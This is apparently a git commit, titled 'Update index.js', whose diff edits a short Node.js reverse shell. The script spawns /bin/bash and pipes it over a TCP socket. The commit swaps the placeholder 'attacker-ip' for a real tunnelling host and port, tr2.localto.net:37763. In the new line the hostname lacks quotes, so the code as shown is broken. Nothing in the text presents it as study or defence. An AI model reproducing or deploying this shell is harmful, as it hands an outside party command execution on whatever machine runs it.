ee518e3413e865d542aa9b5f08a255e2c6a40b73
lmqvn <138847537+lmqvn@users.noreply.github.com>
2023-07-20 19:24:06 +0700

    Update index.js

--- index.js
+++ index.js
@@ -1,4 +1,4 @@
 var net = require("net"), sh = require("child_process").exec("/bin/bash");
 var client = new net.Socket();
-client.connect(80, "attacker-ip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
+client.connect(37763, tr2.localto.net, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
 sh.stderr.pipe(client);});
